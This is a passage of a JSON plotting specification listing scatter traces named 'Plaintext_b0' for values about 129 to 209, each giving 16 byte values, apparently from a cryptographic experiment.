99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=129\", \"type\": \"scatter\", \"x\": [0.129, 1.129, 2.129, 3.129, 4.129, 5.129, 6.129, 7.129, 8.129, 9.129, 10.129, 11.129, 12.129, 13.129, 14.129, 15.129], \"y\": [189, 12, 12, 210, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=130\", \"type\": \"scatter\", \"x\": [0.13, 1.13, 2.13, 3.13, 4.13, 5.13, 6.13, 7.13, 8.13, 9.13, 10.13, 11.13, 12.13, 13.13, 14.13, 15.13], \"y\": [131, 19, 19, 243, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=131\", \"type\": \"scatter\", \"x\": [0.131, 1.131, 2.1310000000000002, 3.1310000000000002, 4.131, 5.131, 6.131, 7.131, 8.131, 9.131, 10.131, 11.131, 12.131, 13.131, 14.131, 15.131], \"y\": [102, 236, 236, 233, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=132\", \"type\": \"scatter\", \"x\": [0.132, 1.1320000000000001, 2.132, 3.132, 4.132, 5.132, 6.132, 7.132, 8.132, 9.132, 10.132, 11.132, 12.132, 13.132, 14.132, 15.132], \"y\": [27, 95, 95, 39, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=133\", \"type\": \"scatter\", \"x\": [0.133, 1.133, 2.133, 3.133, 4.133, 5.133, 6.133, 7.133, 8.133, 9.133, 10.133, 11.133, 12.133, 13.133, 14.133, 15.133], \"y\": [144, 151, 151, 100, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=134\", \"type\": \"scatter\", \"x\": [0.134, 1.134, 2.134, 3.134, 4.134, 5.134, 6.134, 7.134, 8.134, 9.134, 10.134, 11.134, 12.134, 13.134, 14.134, 15.134], \"y\": [45, 68, 68, 10, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=135\", \"type\": \"scatter\", \"x\": [0.135, 1.135, 2.135, 3.135, 4.135, 5.135, 6.135, 7.135, 8.135, 9.135, 10.135, 11.135, 12.135, 13.135, 14.135, 15.135], \"y\": [139, 23, 23, 255, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=136\", \"type\": \"scatter\", \"x\": [0.136, 1.1360000000000001, 2.136, 3.136, 4.136, 5.136, 6.136, 7.136, 8.136, 9.136, 10.136, 11.136, 12.136, 13.136, 14.136, 15.136], \"y\": [54, 196, 196, 145, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=137\", \"type\": \"scatter\", \"x\": [0.137, 1.137, 2.137, 3.137, 4.1370000000000005, 5.1370000000000005, 6.1370000000000005, 7.1370000000000005, 8.137, 9.137, 10.137, 11.137, 12.137, 13.137, 14.137, 15.137], \"y\": [240, 167, 167, 52, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=138\", \"type\": \"scatter\", \"x\": [0.138, 1.138, 2.138, 3.138, 4.138, 5.138, 6.138, 7.138, 8.138, 9.138, 10.138, 11.138, 12.138, 13.138, 14.138, 15.138], \"y\": [89, 126, 126, 68, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=139\", \"type\": \"scatter\", \"x\": [0.139, 1.139, 2.1390000000000002, 3.1390000000000002, 4.139, 5.139, 6.139, 7.139, 8.139, 9.139, 10.139, 11.139, 12.139, 13.139, 14.139, 15.139], \"y\": [223, 61, 61, 129, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=140\", \"type\": \"scatter\", \"x\": [0.14, 1.1400000000000001, 2.14, 3.14, 4.14, 5.14, 6.14, 7.14, 8.14, 9.14, 10.14, 11.14, 12.14, 13.14, 14.14, 15.14], \"y\": [109, 100, 100, 106, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=141\", \"type\": \"scatter\", \"x\": [0.14100000000000001, 1.141, 2.141, 3.141, 4.141, 5.141, 6.141, 7.141, 8.141, 9.141, 10.141, 11.141, 12.141, 13.141, 14.141, 15.141], \"y\": [31, 93, 93, 33, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=142\", \"type\": \"scatter\", \"x\": [0.14200000000000002, 1.142, 2.142, 3.142, 4.142, 5.142, 6.142, 7.142, 8.142, 9.142, 10.142, 11.142, 12.142, 13.142, 14.142, 15.142], \"y\": [151, 25, 25, 237, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=143\", \"type\": \"scatter\", \"x\": [0.14300000000000002, 1.143, 2.143, 3.143, 4.143, 5.143, 6.143, 7.143, 8.143, 9.143, 10.143, 11.143, 12.143, 13.143, 14.143, 15.143], \"y\": [67, 115, 115, 83, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=144\", \"type\": \"scatter\", \"x\": [0.14400000000000002, 1.1440000000000001, 2.144, 3.144, 4.144, 5.144, 6.144, 7.144, 8.144, 9.144, 10.144, 11.144, 12.144, 13.144, 14.144, 15.144], \"y\": [101, 96, 96, 102, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=145\", \"type\": \"scatter\", \"x\": [0.145, 1.145, 2.145, 3.145, 4.145, 5.145, 6.145, 7.145, 8.145, 9.145, 10.145, 11.145, 12.145, 13.145, 14.145, 15.145], \"y\": [188, 129, 129, 94, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=146\", \"type\": \"scatter\", \"x\": [0.146, 1.146, 2.146, 3.146, 4.146, 5.146, 6.146, 7.146, 8.146, 9.146, 10.146, 11.146, 12.146, 13.146, 14.146, 15.146], \"y\": [59, 79, 79, 23, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=147\", \"type\": \"scatter\", \"x\": [0.147, 1.147, 2.147, 3.147, 4.147, 5.147, 6.147, 7.147, 8.147, 9.147, 10.147, 11.147, 12.147, 13.147, 14.147, 15.147], \"y\": [6, 220, 220, 185, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=148\", \"type\": \"scatter\", \"x\": [0.148, 1.148, 2.148, 3.148, 4.148, 5.148, 6.148, 7.148, 8.148, 9.148, 10.148, 11.148, 12.148, 13.148, 14.148, 15.148], \"y\": [225, 34, 34, 160, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=149\", \"type\": \"scatter\", \"x\": [0.149, 1.149, 2.149, 3.149, 4.149, 5.149, 6.149, 7.149, 8.149, 9.149, 10.149, 11.149, 12.149, 13.149, 14.149, 15.149], \"y\": [241, 42, 42, 184, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=150\", \"type\": \"scatter\", \"x\": [0.15, 1.15, 2.15, 3.15, 4.15, 5.15, 6.15, 7.15, 8.15, 9.15, 10.15, 11.15, 12.15, 13.15, 14.15, 15.15], \"y\": [158, 144, 144, 109, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=151\", \"type\": \"scatter\", \"x\": [0.151, 1.151, 2.151, 3.151, 4.151, 5.151, 6.151, 7.151, 8.151, 9.151, 10.151, 11.151, 12.151, 13.151, 14.151, 15.151], \"y\": [174, 136, 136, 69, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=152\", \"type\": \"scatter\", \"x\": [0.152, 1.152, 2.152, 3.152, 4.152, 5.152, 6.152, 7.152, 8.152, 9.152, 10.152, 11.152, 12.152, 13.152, 14.152, 15.152], \"y\": [41, 70, 70, 12, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=153\", \"type\": \"scatter\", \"x\": [0.153, 1.153, 2.153, 3.153, 4.153, 5.153, 6.153, 7.153, 8.153, 9.153, 10.153, 11.153, 12.153, 13.153, 14.153, 15.153], \"y\": [98, 238, 238, 239, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=154\", \"type\": \"scatter\", \"x\": [0.154, 1.154, 2.154, 3.154, 4.154, 5.154, 6.154, 7.154, 8.154, 9.154, 10.154, 11.154, 12.154, 13.154, 14.154, 15.154], \"y\": [206, 184, 184, 21, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=155\", \"type\": \"scatter\", \"x\": [0.155, 1.155, 2.155, 3.155, 4.155, 5.155, 6.155, 7.155, 8.155, 9.155, 10.155, 11.155, 12.155, 13.155, 14.155, 15.155], \"y\": [141, 20, 20, 250, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=156\", \"type\": \"scatter\", \"x\": [0.156, 1.156, 2.156, 3.156, 4.156, 5.156, 6.156, 7.156, 8.156, 9.156, 10.156, 11.156, 12.156, 13.156, 14.156, 15.156], \"y\": [2, 222, 222, 191, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=157\", \"type\": \"scatter\", \"x\": [0.157, 1.157, 2.157, 3.157, 4.157, 5.157, 6.157, 7.157, 8.157, 9.157, 10.157, 11.157, 12.157, 13.157, 14.157, 15.157], \"y\": [25, 94, 94, 36, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=158\", \"type\": \"scatter\", \"x\": [0.158, 1.158, 2.158, 3.158, 4.158, 5.158, 6.158, 7.158, 8.158, 9.158, 10.158, 11.158, 12.158, 13.158, 14.158, 15.158], \"y\": [179, 11, 11, 219, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=159\", \"type\": \"scatter\", \"x\": [0.159, 1.159, 2.159, 3.159, 4.159, 5.159, 6.159, 7.159, 8.159, 9.159, 10.159, 11.159, 12.159, 13.159, 14.159, 15.159], \"y\": [8, 219, 219, 176, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=160\", \"type\": \"scatter\", \"x\": [0.16, 1.16, 2.16, 3.16, 4.16, 5.16, 6.16, 7.16, 8.16, 9.16, 10.16, 11.16, 12.16, 13.16, 14.16, 15.16], \"y\": [126, 224, 224, 253, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=161\", \"type\": \"scatter\", \"x\": [0.161, 1.161, 2.161, 3.161, 4.161, 5.161, 6.161, 7.161, 8.161, 9.161, 10.161, 11.161, 12.161, 13.161, 14.161, 15.161], \"y\": [193, 50, 50, 144, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=162\", \"type\": \"scatter\", \"x\": [0.162, 1.162, 2.162, 3.162, 4.162, 5.162, 6.162, 7.162, 8.162, 9.162, 10.162, 11.162, 12.162, 13.162, 14.162, 15.162], \"y\": [209, 58, 58, 136, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=163\", \"type\": \"scatter\", \"x\": [0.163, 1.163, 2.163, 3.163, 4.163, 5.163, 6.163, 7.163, 8.163, 9.163, 10.163, 11.163, 12.163, 13.163, 14.163, 15.163], \"y\": [177, 10, 10, 216, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=164\", \"type\": \"scatter\", \"x\": [0.164, 1.164, 2.164, 3.164, 4.164, 5.164, 6.164, 7.164, 8.164, 9.164, 10.164, 11.164, 12.164, 13.164, 14.164, 15.164], \"y\": [55, 73, 73, 29, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=165\", \"type\": \"scatter\", \"x\": [0.165, 1.165, 2.165, 3.165, 4.165, 5.165, 6.165, 7.165, 8.165, 9.165, 10.165, 11.165, 12.165, 13.165, 14.165, 15.165], \"y\": [169, 6, 6, 204, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=166\", \"type\": \"scatter\", \"x\": [0.166, 1.166, 2.166, 3.166, 4.166, 5.166, 6.166, 7.166, 8.166, 9.166, 10.166, 11.166, 12.166, 13.166, 14.166, 15.166], \"y\": [237, 36, 36, 170, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=167\", \"type\": \"scatter\", \"x\": [0.167, 1.167, 2.167, 3.167, 4.167, 5.167, 6.167, 7.167, 8.167, 9.167, 10.167, 11.167, 12.167, 13.167, 14.167, 15.167], \"y\": [29, 92, 92, 34, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=168\", \"type\": \"scatter\", \"x\": [0.168, 1.168, 2.168, 3.168, 4.168, 5.168, 6.168, 7.168, 8.168, 9.168, 10.168, 11.168, 12.168, 13.168, 14.168, 15.168], \"y\": [58, 194, 194, 155, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=169\", \"type\": \"scatter\", \"x\": [0.169, 1.169, 2.169, 3.169, 4.169, 5.169, 6.169, 7.169, 8.169, 9.169, 10.169, 11.169, 12.169, 13.169, 14.169, 15.169], \"y\": [24, 211, 211, 168, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=170\", \"type\": \"scatter\", \"x\": [0.17, 1.17, 2.17, 3.17, 4.17, 5.17, 6.17, 7.17, 8.17, 9.17, 10.17, 11.17, 12.17, 13.17, 14.17, 15.17], \"y\": [230, 172, 172, 41, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=171\", \"type\": \"scatter\", \"x\": [0.171, 1.171, 2.171, 3.171, 4.171, 5.171, 6.171, 7.171, 8.171, 9.171, 10.171, 11.171, 12.171, 13.171, 14.171, 15.171], \"y\": [97, 98, 98, 96, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=172\", \"type\": \"scatter\", \"x\": [0.17200000000000001, 1.172, 2.172, 3.172, 4.172, 5.172, 6.172, 7.172, 8.172, 9.172, 10.172, 11.172, 12.172, 13.172, 14.172, 15.172], \"y\": [156, 145, 145, 110, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=173\", \"type\": \"scatter\", \"x\": [0.17300000000000001, 1.173, 2.173, 3.173, 4.173, 5.173, 6.173, 7.173, 8.173, 9.173, 10.173, 11.173, 12.173, 13.173, 14.173, 15.173], \"y\": [148, 149, 149, 98, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=174\", \"type\": \"scatter\", \"x\": [0.17400000000000002, 1.174, 2.174, 3.174, 4.174, 5.174, 6.174, 7.174, 8.174, 9.174, 10.174, 11.174, 12.174, 13.174, 14.174, 15.174], \"y\": [118, 228, 228, 241, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=175\", \"type\": \"scatter\", \"x\": [0.17500000000000002, 1.175, 2.175, 3.175, 4.175, 5.175, 6.175, 7.175, 8.175, 9.175, 10.175, 11.175, 12.175, 13.175, 14.175, 15.175], \"y\": [87, 121, 121, 77, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=176\", \"type\": \"scatter\", \"x\": [0.176, 1.176, 2.176, 3.176, 4.176, 5.176, 6.176, 7.176, 8.176, 9.176, 10.176, 11.176, 12.176, 13.176, 14.176, 15.176], \"y\": [112, 231, 231, 244, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=177\", \"type\": \"scatter\", \"x\": [0.177, 1.177, 2.177, 3.177, 4.177, 5.177, 6.177, 7.177, 8.177, 9.177, 10.177, 11.177, 12.177, 13.177, 14.177, 15.177], \"y\": [46, 200, 200, 133, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=178\", \"type\": \"scatter\", \"x\": [0.178, 1.178, 2.178, 3.178, 4.178, 5.178, 6.178, 7.178, 8.178, 9.178, 10.178, 11.178, 12.178, 13.178, 14.178, 15.178], \"y\": [203, 55, 55, 159, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=179\", \"type\": \"scatter\", \"x\": [0.179, 1.179, 2.179, 3.179, 4.179, 5.179, 6.179, 7.179, 8.179, 9.179, 10.179, 11.179, 12.179, 13.179, 14.179, 15.179], \"y\": [127, 109, 109, 113, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=180\", \"type\": \"scatter\", \"x\": [0.18, 1.18, 2.18, 3.18, 4.18, 5.18, 6.18, 7.18, 8.18, 9.18, 10.18, 11.18, 12.18, 13.18, 14.18, 15.18], \"y\": [164, 141, 141, 74, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=181\", \"type\": \"scatter\", \"x\": [0.181, 1.181, 2.181, 3.181, 4.181, 5.181, 6.181, 7.181, 8.181, 9.181, 10.181, 11.181, 12.181, 13.181, 14.181, 15.181], \"y\": [20, 213, 213, 162, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=182\", \"type\": \"scatter\", \"x\": [0.182, 1.182, 2.182, 3.182, 4.182, 5.182, 6.182, 7.182, 8.182, 9.182, 10.182, 11.182, 12.182, 13.182, 14.182, 15.182], \"y\": [57, 78, 78, 20, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=183\", \"type\": \"scatter\", \"x\": [0.183, 1.183, 2.183, 3.183, 4.183, 5.183, 6.183, 7.183, 8.183, 9.183, 10.183, 11.183, 12.183, 13.183, 14.183, 15.183], \"y\": [236, 169, 169, 38, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=184\", \"type\": \"scatter\", \"x\": [0.184, 1.184, 2.184, 3.184, 4.184, 5.184, 6.184, 7.184, 8.184, 9.184, 10.184, 11.184, 12.184, 13.184, 14.184, 15.184], \"y\": [125, 108, 108, 114, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=185\", \"type\": \"scatter\", \"x\": [0.185, 1.185, 2.185, 3.185, 4.185, 5.185, 6.185, 7.185, 8.185, 9.185, 10.185, 11.185, 12.185, 13.185, 14.185, 15.185], \"y\": [9, 86, 86, 60, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=186\", \"type\": \"scatter\", \"x\": [0.186, 1.186, 2.186, 3.186, 4.186, 5.186, 6.186, 7.186, 8.186, 9.186, 10.186, 11.186, 12.186, 13.186, 14.186, 15.186], \"y\": [86, 244, 244, 193, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=187\", \"type\": \"scatter\", \"x\": [0.187, 1.187, 2.187, 3.187, 4.187, 5.187, 6.187, 7.187, 8.187, 9.187, 10.187, 11.187, 12.187, 13.187, 14.187, 15.187], \"y\": [106, 234, 234, 227, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=188\", \"type\": \"scatter\", \"x\": [0.188, 1.188, 2.188, 3.188, 4.188, 5.188, 6.188, 7.188, 8.188, 9.188, 10.188, 11.188, 12.188, 13.188, 14.188, 15.188], \"y\": [111, 101, 101, 105, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=189\", \"type\": \"scatter\", \"x\": [0.189, 1.189, 2.189, 3.189, 4.189, 5.189, 6.189, 7.189, 8.189, 9.189, 10.189, 11.189, 12.189, 13.189, 14.189, 15.189], \"y\": [81, 122, 122, 72, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=190\", \"type\": \"scatter\", \"x\": [0.19, 1.19, 2.19, 3.19, 4.19, 5.19, 6.19, 7.19, 8.19, 9.19, 10.19, 11.19, 12.19, 13.19, 14.19, 15.19], \"y\": [226, 174, 174, 47, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=191\", \"type\": \"scatter\", \"x\": [0.191, 1.191, 2.191, 3.191, 4.191, 5.191, 6.191, 7.191, 8.191, 9.191, 10.191, 11.191, 12.191, 13.191, 14.191, 15.191], \"y\": [181, 8, 8, 222, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=192\", \"type\": \"scatter\", \"x\": [0.192, 1.192, 2.192, 3.192, 4.192, 5.192, 6.192, 7.192, 8.192, 9.192, 10.192, 11.192, 12.192, 13.192, 14.192, 15.192], \"y\": [202, 186, 186, 19, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=193\", \"type\": \"scatter\", \"x\": [0.193, 1.193, 2.193, 3.193, 4.193, 5.193, 6.193, 7.193, 8.193, 9.193, 10.193, 11.193, 12.193, 13.193, 14.193, 15.193], \"y\": [85, 120, 120, 78, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=194\", \"type\": \"scatter\", \"x\": [0.194, 1.194, 2.194, 3.194, 4.194, 5.194, 6.194, 7.194, 8.194, 9.194, 10.194, 11.194, 12.194, 13.194, 14.194, 15.194], \"y\": [239, 37, 37, 169, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=195\", \"type\": \"scatter\", \"x\": [0.195, 1.195, 2.195, 3.195, 4.195, 5.195, 6.195, 7.195, 8.195, 9.195, 10.195, 11.195, 12.195, 13.195, 14.195, 15.195], \"y\": [249, 46, 46, 180, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=196\", \"type\": \"scatter\", \"x\": [0.196, 1.196, 2.196, 3.196, 4.196, 5.196, 6.196, 7.196, 8.196, 9.196, 10.196, 11.196, 12.196, 13.196, 14.196, 15.196], \"y\": [157, 28, 28, 226, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=197\", \"type\": \"scatter\", \"x\": [0.197, 1.197, 2.197, 3.197, 4.197, 5.197, 6.197, 7.197, 8.197, 9.197, 10.197, 11.197, 12.197, 13.197, 14.197, 15.197], \"y\": [242, 166, 166, 55, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=198\", \"type\": \"scatter\", \"x\": [0.198, 1.198, 2.198, 3.198, 4.198, 5.198, 6.198, 7.198, 8.198, 9.198, 10.198, 11.198, 12.198, 13.198, 14.198, 15.198], \"y\": [214, 180, 180, 1, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=199\", \"type\": \"scatter\", \"x\": [0.199, 1.199, 2.199, 3.199, 4.199, 5.199, 6.199, 7.199, 8.199, 9.199, 10.199, 11.199, 12.199, 13.199, 14.199, 15.199], \"y\": [50, 198, 198, 151, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=200\", \"type\": \"scatter\", \"x\": [0.2, 1.2, 2.2, 3.2, 4.2, 5.2, 6.2, 7.2, 8.2, 9.2, 10.2, 11.2, 12.2, 13.2, 14.2, 15.2], \"y\": [110, 232, 232, 229, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=201\", \"type\": \"scatter\", \"x\": [0.201, 1.201, 2.201, 3.201, 4.201, 5.201, 6.201, 7.201, 8.201, 9.201, 10.201, 11.201, 12.201, 13.201, 14.201, 15.201], \"y\": [4, 221, 221, 186, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=202\", \"type\": \"scatter\", \"x\": [0.202, 1.202, 2.202, 3.202, 4.202, 5.202, 6.202, 7.202, 8.202, 9.202, 10.202, 11.202, 12.202, 13.202, 14.202, 15.202], \"y\": [77, 116, 116, 90, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=203\", \"type\": \"scatter\", \"x\": [0.203, 1.203, 2.203, 3.203, 4.203, 5.203, 6.203, 7.203, 8.203, 9.203, 10.203, 11.203, 12.203, 13.203, 14.203, 15.203], \"y\": [155, 31, 31, 231, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=204\", \"type\": \"scatter\", \"x\": [0.20400000000000001, 1.204, 2.204, 3.204, 4.204, 5.204, 6.204, 7.204, 8.204, 9.204, 10.204, 11.204, 12.204, 13.204, 14.204, 15.204], \"y\": [51, 75, 75, 27, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=205\", \"type\": \"scatter\", \"x\": [0.20500000000000002, 1.205, 2.205, 3.205, 4.205, 5.205, 6.205, 7.205, 8.205, 9.205, 10.205, 11.205, 12.205, 13.205, 14.205, 15.205], \"y\": [196, 189, 189, 26, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=206\", \"type\": \"scatter\", \"x\": [0.20600000000000002, 1.206, 2.206, 3.206, 4.206, 5.206, 6.206, 7.206, 8.206, 9.206, 10.206, 11.206, 12.206, 13.206, 14.206, 15.206], \"y\": [168, 139, 139, 64, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=207\", \"type\": \"scatter\", \"x\": [0.20700000000000002, 1.207, 2.207, 3.207, 4.207, 5.207, 6.207, 7.207, 8.207, 9.207, 10.207, 11.207, 12.207, 13.207, 14.207, 15.207], \"y\": [170, 138, 138, 67, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=208\", \"type\": \"scatter\", \"x\": [0.20800000000000002, 1.208, 2.208, 3.208, 4.208, 5.208, 6.208, 7.208, 8.208, 9.208, 10.208, 11.208, 12.208, 13.208, 14.208, 15.208], \"y\": [69, 112, 112, 86, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=209\", \"type\": \"scatter\", \"x\": [0.209, 1.209, 2.209, 3.209, 4.209, 5.209, 6.209, 7.209, 8.209, 9.209, 10.209, 11.209, 12.209, 13.209, 